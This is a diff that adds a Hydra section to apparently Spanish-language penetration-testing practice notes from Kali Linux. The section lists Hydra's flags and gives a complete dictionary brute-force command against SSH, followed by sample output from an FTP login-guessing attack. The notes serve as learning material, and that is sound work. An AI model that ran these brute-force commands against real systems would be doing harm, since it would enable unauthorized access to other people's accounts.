@@ -145,4 +145,37 @@ Yersinia is a framework for performing layer 2 attacks. It is designed to take a
 
 *Saturara la red de solicitudes con paquetes DCHP*
 
+### Hydra
+Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.
+
+##### Atque de diccionario de fuerza bruta a cualquiera de los protocolos disponibles.
+
+Directorio por defecto:
+`usr/share/wordlists/fasttrack.txt`
+
+Flags:
+``` 
+-L lista de usuarios
+-l usuario
+-P archivo
+-s puerto
+protocolo
+-f terminar
+-vV mostrar proceso
+-t hilos en paralelo
+```
+
+Comando:
+```
+hydra -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/sqlmap.txt -s 22 ssh://192.168.40.10 -V -t 4  
+```
+
+Ejemplo de ataque a puerto FTP
+```
+OUTPUT:
+[DATA] attacking ftp://75.52.185.xxx:21/
+[ATTEMPT] target 75.52.xxx.132 - login "Spring2017" - pass "Spring2017" - 1 of 49284 [child 0] (0/0)
+[ATTEMPT] target 75.52.xxx.132 - login "Spring2017" - pass "Spring2016" - 2 of 49285 [child 0] (0/1)
+```
+
 > Practica realizada en Kali Linux
